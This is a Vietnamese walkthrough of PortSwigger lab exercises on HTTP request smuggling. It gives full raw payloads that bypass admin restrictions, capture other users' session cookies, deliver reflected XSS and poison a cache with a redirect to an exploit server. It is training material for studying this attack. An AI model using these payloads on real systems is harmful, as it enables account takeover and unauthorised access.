# [Portswigger] HTTP request smuggling

***

## 1. Lab: HTTP request smuggling, basic CL.TE vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
* Giao diện web:

<img width="598" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ae9cf1d-c0b7-470c-98b7-7e7852a7bf97">

* Exploit:

Thực hiện `Change Request Method` sang từ `GET` thành `POST`, lưu ý chuyển sang sử dụng `HTTP/1.1`

Tiến hành send request trên 2 lần => Đến lần thứ 2 sẽ ra thông báo lỗi như yêu cầu của đề bài.

![telegram-cloud-photo-size-5-6127662865662981520-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/65aa6883-737f-467f-af44-65c6e95be974)

Lab Solved!!!

![telegram-cloud-photo-size-5-6127662865662981521-y](https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/e7e5cb93-e7bb-4b4c-a22f-f848f18db027)

***
## 2. Lab: HTTP request smuggling, basic TE.CL vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```
* Exploit:

```
POST / HTTP/1.1
Host: 0a5700bd049eb5f080b3262900b000fa.web-security-academy.net
Sec-Ch-Ua: "Chromium";v="107", "Not=A?Brand";v="24"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 14

x=1
0


```

<img width="623" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1bbb7951-f460-4787-98ae-c1ee22e921b0">

***

## 3. Lab: HTTP request smuggling, obfuscating the TE header

* Content:
```
This lab involves a front-end and back-end server, and the two servers handle duplicate HTTP request headers in different ways. The front-end server rejects requests that aren't using the GET or POST method.

To solve the lab, smuggle a request to the back-end server, so that the next request processed by the back-end server appears to use the method GPOST.
```

* Exploit:
```
POST / HTTP/1.1
Host: 0a8f00030302867584f35f9500110006.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Transfer-Encoding: chunked
Transfer-Encoding: cow

5c
GPOST / HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

x=1
0



```
<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/ce94f9e0-f028-48cf-b177-05f0fad27c25">

<img width="621" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/46cb025c-799e-468e-a2b6-8888cf946704">

***

## 4. Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

* Exploit:

Lưu ý của bài này là biết cách sử dụng đúng của `Transfer-Encoding: chunk`. e=14 character => độ dài của `q=smuggling123` là 14.

```
POST / HTTP/1.1
Host: 0acc008a03189284827d56400078008f.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Transfer-Encoding: chunked

e
q=smuggling123
0

GET /404 HTTP/1.1
x: x
```

<img width="482" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/de9271cf-b836-49b7-b6b5-bdb71e2b3613">

<img width="602" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/40fdc7bd-3f12-465f-b85c-d8cbe831ec94">

***
## 5. Lab: HTTP request smuggling, confirming a TE.CL vulnerability via differential responses

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server, so that a subsequent request for / (the web root) triggers a 404 Not Found response.
```

* Exploit:

```
POST / HTTP/1.1
Host: 0a8a0045041de09184d61ec300a80066.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

5e
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
0


```
Giải thích: 
- 5e unhex = 94 = Độ dài của phần 
```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
```
- Do backend không hỗ trợ `Transfer-Encoding` + `Content-Lenghth: 4` => Phần sau 5e sẽ được backend hiểu là thuộc Request riêng biệt.
- Request riêng này như sau:
```
POST /404 HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

x=1POST / HTTP/1.1
```
- `Content-Length: 18` = số ký tự của `x=1POST / HTTP/1.1`

<img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c9dce484-9eaf-40a5-9d59-fb9a60f608f0">

***
## 6. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```
* Exploit:

Thực hiện gửi request Payload đầu tiên như ảnh dưới đây 2 lần => Kết quả báo Request Smugged bị chặn.
<img width="480" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/42f634d4-7ca2-43e2-b2de-d0b3db1db6c4">

Bổ sung thêm thường Request header `Host: localhost` vào Payload => Lần này ứng dụng báo lỗi `Duplicate header names are not allowed`.
<img width="470" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/23dfe300-466e-4b92-9496-9e442b3a028a">

Nguyên nhân là sau khi gửi Request 2 lần thì Request Smugged sẽ trở thành như sau:
```
GET /admin HTTP/1.1
Host: localhost
POST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
Connection: close
...
```
=> Bị trùng trường `Host` header 2 lần.

Bây giờ cần chỉnh sửa payload như sau để phần Host Header của Request sau Không ăn vào Phần Header của Smugged Request mà ăn xuống phần Body.
<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9518ba8d-d316-4b25-bfbf-8eec2589be37">
=> Khi này Request Smugged sẽ như sau:
```
GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=bPOST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
....
```

Tiếp tục thực hiện Smugged Request gọi đến link `/admin/delete?username=carlos` theo yêu cầu của Challenge:

Full payload như sau:
```
POST / HTTP/1.1
Host: 0a3d0084040bb3b681a3116800fc0061.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
```
<img width="484" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4db05e14-49ad-4ea9-a7b8-55c8b842cec8">

Lab Solved!

<img width="593" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f60dbfbf-97ce-4d95-a902-b8652472932f">

***

## 7. Lab: Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability

* Content:
```
This lab involves a front-end and back-end server, and the back-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```

* Exploit:

<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/c6e959a6-ce3f-46d8-b0c2-0968bd2ecef8">

Gọi đến link delete:

<img width="472" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/5dd0822c-2a6d-4936-9b9d-6f9edbeb0d0e">

Full payload như sau:

```
POST / HTTP/1.1
Host: 0a64008c03fb619d82b6b5d400a200dc.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 2
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
0


```

Lab Solved!

<img width="589" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f73bbf7c-9eb2-479d-b1c3-577c9a709f14">

***

## 8. Lab: Exploiting HTTP request smuggling to reveal front-end request rewriting

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

There's an admin panel at /admin, but it's only accessible to people with the IP address 127.0.0.1. The front-end server adds an HTTP header to incoming requests containing their IP address. It's similar to the X-Forwarded-For header but has a different name.

To solve the lab, smuggle a request to the back-end server that reveals the header that is added by the front-end server. Then smuggle a request to the back-end server that includes the added header, accesses the admin panel, and deletes the user carlos.
```
* Exploit:

Thử chức năng test kiểm tra xem có phát hiện ra trường header ẩn được front-end tự động gắn vào request gửi sang back-end hay không?

<img width="478" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/9a6ec521-d66f-4376-9f2a-b51225e5dff6">

Sau khi phát hiện ra Header `X-XWtfcJ-Ip` => Tiến hành gửi payload đến /admin

<img width="481" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/0b4a4ad8-151b-4815-9603-045c6006f09b">

Okay vẫn lỗi như level trước. Tiếp tục thay đỏi payload:

<img width="479" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/1c7c89c9-e98c-4864-954a-1a12b63444a7">

<img width="483" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/4041fee5-44b5-46ae-b219-40d5374d43d5">

Full payload cụ thể:
```
POST / HTTP/1.1
Host: 0a8000dd030f3990807d7b38007d00b6.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Transfer-Encoding: chunked

0


GET /admin/delete?username=carlos HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 300
X-gnVjFm-Ip: 127.0.0.1

a=b
```

***
## 9. Lab: Exploiting HTTP request smuggling to capture other users' requests
* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to be stored in the application. Then retrieve the next user's request and use the victim user's cookies to access their account.
```
* Exploit:

Ban đầu, gửi một post comment để xác định các trường thông tin cần thiết để thực hiện post comment => Ta xác định được cần có thông tin Cookie session và csrf token.

<img width="514" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/325c6ddd-9ba4-40ef-a181-ac0e9c7fe4ef">

Chuẩn bị 1 đoạn payload smuggling như sau => Các request sau của Victim sẽ bị thêm vào phía sau phần `hihi` trong nội dung Comment và được Post lên bài viết (với length tùy ý theo điều chỉnh của chúng ta, ở đây đang set là 900)

<img width="477" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/067b4efe-b321-4859-b184-ccaf1f644f45">

Full payload:
```
POST / HTTP/1.1
Host: 0a7a00230394ed7f80e0c62a001700f0.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 253
Transfer-Encoding: chunked

0


POST /post/comment HTTP/1.1
Cookie: session=8FDVtKRmOh9Z1v3Zczw78Z473Nqko7IP
Content-Type: application/x-www-form-urlencoded
Content-Length: 900

csrf=FRtctewUJ38rlaPWJFSaf5mt56clwrgq&postId=9&name=testname&email=test%40test.net&comment=hihi
```
Sau 1 vài request, thu được nội dung như sau:

<img width="368" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/891e5a8d-e799-4507-a6e8-8138bbc0831b">

Sử dụng cookie trên để login vào user vicim và Resolve Lab:

<img width="385" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/2ede167e-5d05-4653-8ea6-faa62ee2d46b">

***
## 10. Lab: Exploiting HTTP request smuggling to deliver reflected XSS
* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding.

The application is also vulnerable to reflected XSS via the User-Agent header.

To solve the lab, smuggle a request to the back-end server that causes the next user's request to receive a response containing an XSS exploit that executes alert(1).
```
* Exploit:

- Xác định vị trí mắc lỗi XSS:

<img width="480" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/3c87706e-69d8-4cc8-a7e7-b3706a2f04f5">

=> Truyền vị trí mắc lõi vào vào Smuggling Request:

<img width="477" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/f91d859b-def3-4dea-931d-61d06a739227">

Full Payload:
```
POST / HTTP/1.1
Host: 0a0500b1047eb72880183f2f00a6005d.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 151
Transfer-Encoding: chunked

0


GET /post?postId=2 HTTP/1.1
User-Agent: "><script>alert(1)</script>
Content-Type: application/x-www-form-urlencoded
Content-Length: 18

a=b
```
***
## 11. Lab: Exploiting HTTP request smuggling to perform web cache poisoning

* Content:
```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. The front-end server is configured to cache certain responses.

To solve the lab, perform a request smuggling attack that causes the cache to be poisoned, such that a subsequent request for a JavaScript file receives a redirection to the exploit server. The poisoned cache should alert document.cookie.
```
* Exploit:

<img width="476" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/7930cc05-0b13-4c32-a155-3fbf3611c62a">

<img width="478" alt="image" src="https://github.com/nguyenkhai98/nguyenkhai98.github.io/assets/51147179/606fd5bb-8750-426a-87ee-26cfc8096c93">

Lý do dùng Smuggling Request call đến `/post/next?postId=3` là do khi này Sau khi cache, sẽ redirect đến `https://exploit-0a3a007503c0fb02809148da01a800b3.exploit-server.net/post?postId=4` (/post của máy exploit).

Full Payload:
```
POST / HTTP/1.1
Host: 0a4600f8039dfbc98093496b0060005c.web-security-academy.net
Connection: close
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 182
Transfer-Encoding: chunked

0


GET /post/next?postId=3 HTTP/1.1
Host: exploit-0a3a007503c0fb02809148da01a800b3.exploit-server.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

a=b
```
